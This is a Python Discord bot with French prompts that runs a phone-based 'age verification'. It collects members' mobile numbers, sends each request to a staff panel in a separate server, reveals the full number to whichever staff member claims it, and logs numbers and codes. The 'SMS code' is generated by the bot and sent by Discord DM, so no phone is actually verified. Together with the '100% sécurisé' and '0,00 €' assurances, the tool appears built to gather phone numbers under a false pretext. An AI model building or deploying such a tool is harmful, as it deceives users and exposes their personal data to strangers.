import discord
from discord import app_commands
from discord.ext import commands
import asyncio
import datetime
import os
import logging
from typing import Optional, Dict
from aiohttp import web
import config
from utils import validate_phone, mask_phone, generate_code, validate_code

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
log = logging.getLogger("VerifBot")

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

cooldowns: Dict[int, float] = {}
verified_users: Dict[int, dict] = {}

async def health_handler(request):
    return web.Response(text="OK", status=200)

async def start_health_server():
    app = web.Application()
    app.router.add_get("/", health_handler)
    app.router.add_get("/health", health_handler)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", config.PORT)
    await site.start()
    log.info(f"Health check server on port {config.PORT}")

async def send_log(title: str, description: str = "", color: int = 0x2b2d31, fields: list = None, user: discord.User = None):
    channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if not channel:
        return
    embed = discord.Embed(title=title, description=description, color=color, timestamp=datetime.datetime.now())
    if fields:
        for name, value, inline in fields:
            embed.add_field(name=name, value=value, inline=inline)
    if user:
        embed.set_thumbnail(url=user.display_avatar.url)
    embed.set_footer(text=f"Logs • {datetime.datetime.now().strftime('%d/%m/%Y %H:%M')}")
    await channel.send(embed=embed)

class PhoneModal(discord.ui.Modal, title="📱 Vérification"):
    phone = discord.ui.TextInput(
        label="Numéro de téléphone",
        placeholder="0612345678",
        min_length=10,
        max_length=10,
        required=True,
    )

    async def on_submit(self, interaction: discord.Interaction):
        now = datetime.datetime.now().timestamp()

        if interaction.user.id in cooldowns:
            remaining = cooldowns[interaction.user.id] + config.COOLDOWN_SECONDS - now
            if remaining > 0:
                embed = discord.Embed(title="⏳ Cooldown", description=f"Veuillez attendre **{int(remaining)} secondes** avant de réessayer.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

        if interaction.user.id in verified_users:
            embed = discord.Embed(title="⏳ Déjà en cours", description="Vous avez déjà une vérification en attente.", color=0xfee75c)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        phone_raw = self.phone.value.strip().replace(" ", "").replace("-", "")
        valid, err_msg = validate_phone(phone_raw)
        if not valid:
            embed = discord.Embed(title="❌ Numéro invalide", description=err_msg, color=0xed4245)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        cooldowns[interaction.user.id] = now
        guild_name = interaction.guild.name if interaction.guild else "Inconnu"

        embed_wait = discord.Embed(
            title="📩 Code de vérification",
            description="✅ **Votre demande a bien été prise en compte !**\n\n📱 Vous allez recevoir un **code de vérification par message privé**.\n⏱️ Cela peut prendre **jusqu'à 5 minutes**.\n💰 **Aucun débit** — 0,00 €\n\n📌 Merci de patienter.",
            color=0x57f287
        )
        embed_wait.set_footer(text="Vérification • 0,00 €")
        await interaction.response.send_message(embed=embed_wait, ephemeral=True)

        await send_log(
            title="📋 Nouvelle demande",
            description=f"**{interaction.user}** a envoyé une demande de vérification.",
            color=0x5865f2,
            user=interaction.user,
            fields=[
                ("👤 Pseudo", str(interaction.user), True),
                ("🆔 ID", f"`{interaction.user.id}`", True),
                ("📱 Numéro", f"`{mask_phone(phone_raw)}`", False),
                ("🕐 Date", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)
            ]
        )

        await send_staff_panel(interaction.user, phone_raw, guild_name)

    async def on_error(self, interaction: discord.Interaction, error: Exception) -> None:
        log.error(f"Modal error: {error}")
        embed = discord.Embed(title="❌ Erreur", description="Une erreur est survenue. Réessaye.", color=0xed4245)
        await interaction.response.send_message(embed=embed, ephemeral=True)

def build_staff_embed(user: discord.User, phone: str, guild_name: str, status: str = "En attente", claimed_by: Optional[int] = None, code_status: str = "*En attente...*", timestamp: Optional[datetime.datetime] = None) -> discord.Embed:
    if timestamp is None:
        timestamp = datetime.datetime.now()
    embed = discord.Embed(title="🔞 NOUVELLE DEMANDE DE VÉRIFICATION", color=0x5865f2, timestamp=timestamp)
    embed.set_thumbnail(url=user.display_avatar.url)
    embed.add_field(name="👤 **Utilisateur**", value=f"{user.mention}", inline=True)
    embed.add_field(name="🆔 **ID**", value=f"`{user.id}`", inline=True)
    embed.add_field(name="📱 **Numéro**", value=f"`{mask_phone(phone)}`", inline=True)
    embed.add_field(name="🌐 **Serveur**", value=guild_name, inline=True)
    embed.add_field(name="📌 **Statut**", value=f"⏳ {status}", inline=True)
    embed.add_field(name="🔑 **Code SMS**", value=code_status, inline=True)
    embed.add_field(name="👮 **Pris en charge par**", value=f"<@{claimed_by}>" if claimed_by else "*Personne*", inline=False)
    embed.set_footer(text=f"Aujourd'hui à {timestamp.strftime('%H:%M')} • Vérification")
    return embed

class StaffPanelView(discord.ui.View):
    def __init__(self, user_id: int, phone: str, guild_name: str):
        super().__init__(timeout=None)
        self.user_id = user_id
        self.phone = phone
        self.guild_name = guild_name
        self.claimed_by: Optional[int] = None
        self.code_sent = False
        self.code_value: Optional[str] = None
        self.message: Optional[discord.Message] = None

    @discord.ui.button(label="📋 Prendre en charge", style=discord.ButtonStyle.primary, custom_id="claim_btn")
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if self.claimed_by is not None:
                embed = discord.Embed(title="❌ Déjà pris", description=f"Cette vérification est déjà prise par <@{self.claimed_by}>.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            self.claimed_by = interaction.user.id

            embed_reveal = discord.Embed(title="📱 Numéro dévoilé", description=f"```\n{self.phone}\n```\n⚠️ Ne partagez pas ce numéro.", color=0x57f287, timestamp=datetime.datetime.now())
            await interaction.response.send_message(embed=embed_reveal, ephemeral=True)

            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="En cours", claimed_by=self.claimed_by, code_status="*En attente...*", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            await interaction.message.edit(embed=new_embed, view=self)

            await send_log(title="📋 Vérification prise en charge", description=f"**{interaction.user.name}** a pris en charge la vérification.", color=0x57f287, fields=[("👮 Staff", f"<@{interaction.user.id}>", True), ("👤 Utilisateur", f"<@{self.user_id}>", True), ("📱 Numéro", f"||{self.phone}||", False)])
        except Exception as e:
            log.error(f"Claim error: {e}")
            embed = discord.Embed(title="❌ Erreur", description=f"Une erreur est survenue: {str(e)[:100]}", color=0xed4245)
            try:
                await interaction.response.send_message(embed=embed, ephemeral=True)
            except:
                await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="🔑 Envoyer le code", style=discord.ButtonStyle.success, custom_id="code_btn")
    async def code_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if self.claimed_by is None:
                embed = discord.Embed(title="❌ Personne n'a pris", description="Prenez d'abord la vérification en charge avant d'envoyer le code.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            if self.claimed_by != interaction.user.id:
                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut envoyer le code.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            if self.code_sent:
                embed = discord.Embed(title="⚠️ Déjà envoyé", description="Un code a déjà été envoyé à cet utilisateur.", color=0xfee75c)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            self.code_value = generate_code()
            self.code_sent = True
            verified_users[self.user_id] = {"code": self.code_value, "phone": self.phone, "claimed_by": interaction.user.id, "guild_name": self.guild_name}

            embed_waiting = discord.Embed(title="⏳ Code envoyé", description=f"📱 Un code de vérification a été envoyé à <@{self.user_id}>.\n\n🔐 **Code : `{self.code_value}`**\n\n⏳ En attente de la réponse de l'utilisateur...", color=0xfee75c, timestamp=datetime.datetime.now())
            embed_waiting.set_footer(text="L'utilisateur doit répondre en MP avec le code")
            await interaction.response.send_message(embed=embed_waiting, ephemeral=True)

            try:
                user = await bot.fetch_user(self.user_id)
                embed_dm = discord.Embed(title="🔐 Code de vérification", description=f"**Votre code de vérification : `{self.code_value}`**\n\nVeuillez **répondre à ce message** avec le code à 4 chiffres.\n\n⚠️ Ne partagez ce code avec personne.", color=0x5865f2)
                embed_dm.set_footer(text="Répondez avec le code uniquement • 0,00 €")
                await user.send(embed=embed_dm)

                await send_log(title="🔑 Code envoyé", description=f"Code envoyé à <@{self.user_id}> par **{interaction.user.name}**.", color=0xfee75c, user=user, fields=[("👤 Utilisateur", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("🔐 Code", f"||{self.code_value}||", False)])
            except discord.Forbidden:
                embed_fail = discord.Embed(title="❌ Échec", description=f"<@{self.user_id}> a ses MP fermés. Impossible d'envoyer le code.", color=0xed4245)
                await interaction.followup.send(embed=embed_fail, ephemeral=True)
                self.code_sent = False
                self.code_value = None
                verified_users.pop(self.user_id, None)
                return

            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="Code envoyé", claimed_by=self.claimed_by, code_status="✅ Envoyé", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            await interaction.message.edit(embed=new_embed, view=self)
        except Exception as e:
            log.error(f"Code button error: {e}")
            embed = discord.Embed(title="❌ Erreur", description=f"Une erreur est survenue: {str(e)[:100]}", color=0xed4245)
            try:
                await interaction.response.send_message(embed=embed, ephemeral=True)
            except:
                await interaction.followup.send(embed=embed, ephemeral=True)

    @discord.ui.button(label="❌ Fermer", style=discord.ButtonStyle.danger, custom_id="close_btn")
    async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        try:
            if self.claimed_by is not None and self.claimed_by != interaction.user.id:
                embed = discord.Embed(title="❌ Pas votre vérification", description=f"Seul <@{self.claimed_by}> peut fermer cette vérification.", color=0xed4245)
                await interaction.response.send_message(embed=embed, ephemeral=True)
                return

            verified_users.pop(self.user_id, None)
            cooldowns.pop(self.user_id, None)

            for child in self.children:
                if isinstance(child, discord.ui.Button):
                    child.disabled = True

            user_fetch = await bot.fetch_user(self.user_id)
            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, guild_name=self.guild_name, status="🔒 Fermé", claimed_by=self.claimed_by, code_status="❌ Expiré", timestamp=interaction.message.created_at)
            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
            new_embed.color = 0xed4245
            await interaction.response.edit_message(embed=new_embed, view=self)

            await send_log(title="🔒 Vérification fermée", description=f"Vérification fermée par **{interaction.user.name}**.", color=0xed4245, fields=[("👤 Utilisateur", f"<@{self.user_id}>", True), ("👮 Staff", f"<@{interaction.user.id}>", True), ("📱 Numéro", f"`{mask_phone(self.phone)}`", False)])
        except Exception as e:
            log.error(f"Close error: {e}")

async def send_staff_panel(user: discord.User, phone: str, guild_name: str):
    guild = bot.get_guild(config.STAFF_GUILD_ID)
    if not guild:
        log.error(f"Staff guild {config.STAFF_GUILD_ID} introuvable.")
        return
    channel = guild.get_channel(config.STAFF_CHANNEL_ID)
    if not channel:
        log.error(f"Staff channel {config.STAFF_CHANNEL_ID} introuvable.")
        return

    view = StaffPanelView(user.id, phone, guild_name)
    embed = build_staff_embed(user=user, phone=phone, guild_name=guild_name, status="En attente", claimed_by=None, code_status="*En attente...*")
    embed.set_thumbnail(url=user.display_avatar.url)
    msg = await channel.send(content="@everyone", embed=embed, view=view)
    view.message = msg

async def handle_dm_code(message: discord.Message):
    user_id = message.author.id
    pending = verified_users.get(user_id)
    if pending is None:
        return

    content = message.content.strip()

    valid, err_msg = validate_code(content)
    if not valid:
        embed = discord.Embed(title="❌ Code invalide", description=err_msg, color=0xed4245)
        await message.channel.send(embed=embed)
        return

    if content != pending["code"]:
        if content in ["1234","2345","3456","4567","5678","6789","7890","4321","5432","6543","7654","8765","9876","0987"] or len(set(content)) == 1:
            embed = discord.Embed(title="❌ Code invalide", description="Ce code n'est pas valide (chiffres répétés ou séquentiels). Veuillez contacter le staff.", color=0xed4245)
            await message.channel.send(embed=embed)
            return
        embed = discord.Embed(title="❌ Code incorrect", description="Le code que vous avez entré est incorrect. Veuillez réessayer.", color=0xed4245)
        await message.channel.send(embed=embed)
        return

    phone = pending["phone"]
    claimed_by = pending.get("claimed_by")
    guild_name = pending.get("guild_name", "Inconnu")
    verified_users.pop(user_id, None)

    embed_success = discord.Embed(title="✅ Vérification réussie !", description="Votre numéro de téléphone a été vérifié avec succès.\nMerci de votre patience.\n\n🔓 Accès autorisé.", color=0x57f287)
    await message.channel.send(embed=embed_success)

    log_channel = bot.get_channel(config.LOG_CHANNEL_ID)
    if log_channel:
        embed_log = discord.Embed(title="✅ CODE VALIDÉ", description=f"**Code :** `{content}`", color=0x57f287, timestamp=datetime.datetime.now())
        embed_log.add_field(name="👤 **Utilisateur**", value=f"{message.author.mention} (`{user_id}`)", inline=True)
        embed_log.add_field(name="👮 **Staff**", value=f"<@{claimed_by}>" if claimed_by else "*Inconnu*", inline=True)
        embed_log.add_field(name="📱 **Numéro**", value=f"||{phone}||", inline=True)
        embed_log.add_field(name="🌐 **Serveur**", value=guild_name, inline=True)
        embed_log.add_field(name="🕐 **Date**", value=datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), inline=True)
        embed_log.set_thumbnail(url=message.author.display_avatar.url)
        embed_log.set_footer(text="Code vérifié avec succès")
        await log_channel.send(content=f"<@{claimed_by}> ✅ Code validé !", embed=embed_log)

    await send_log(title="✅ Code validé", description=f"**{message.author.name}** a validé son code.", color=0x57f287, user=message.author, fields=[("👤 Utilisateur", f"<@{user_id}>", True), ("👮 Staff", f"<@{claimed_by}>" if claimed_by else "Inconnu", True), ("🔐 Code", f"||{content}||", True), ("📱 Numéro", f"||{phone}||", False), ("🕐 Validé", datetime.datetime.now().strftime('%d/%m/%Y %H:%M'), False)])

    if config.VERIFIED_ROLE_ID and config.GUILD_ID:
        guild = bot.get_guild(config.GUILD_ID)
        if guild:
            role = guild.get_role(config.VERIFIED_ROLE_ID)
            if role:
                member = guild.get_member(user_id)
                if member:
                    try:
                        await member.add_roles(role, reason="Vérification téléphone réussie")
                        log.info(f"Rôle donné à {message.author.name}")
                    except discord.Forbidden:
                        log.warning(f"Permission manquante rôle {user_id}")

@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
@app_commands.default_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="🔞 Vérification d'âge requise",
        description="Pour accéder à ce serveur, vous devez vérifier votre âge.\n\n**Procédure :**\n1️⃣ Cliquez sur **Vérifier**\n2️⃣ Entrez votre numéro de téléphone (06/07)\n3️⃣ Vous recevrez un **code à 4 chiffres** par MP\n4️⃣ Répondez avec le code pour valider\n\n🔒 **100% sécurisé** • 💰 **0,00 €**",
        color=0x5865f2
    )
    embed.set_footer(text="Système de vérification automatique")

    view = discord.ui.View(timeout=None)
    class VerifyButton(discord.ui.Button):
        def __init__(self):
            super().__init__(label="✅ Vérifier", style=discord.ButtonStyle.success, custom_id="global_verify_btn")
        async def callback(self, inter: discord.Interaction):
            await inter.response.send_modal(PhoneModal())
    view.add_item(VerifyButton())
    await interaction.response.send_message(embed=embed, view=view)
    log.info(f"✅ Setup fait dans #{interaction.channel.name}")

@bot.tree.command(name="sync", description="Sync les commandes slash")
@app_commands.default_permissions(administrator=True)
async def sync(interaction: discord.Interaction):
    await bot.tree.sync()
    embed = discord.Embed(title="✅ Commandes synchronisées", color=0x57f287)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.event
async def on_ready():
    log.info(f"✅ Connecté : {bot.user}")
    await bot.tree.sync()
    log.info("Commandes slash synchronisées.")
    asyncio.create_task(start_health_server())

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return
    if isinstance(message.channel, discord.DMChannel):
        await handle_dm_code(message)

if __name__ == "__main__":
    if not config.BOT_TOKEN:
        log.critical("BOT_TOKEN manquant dans .env")
        exit(1)
    bot.run(config.BOT_TOKEN)
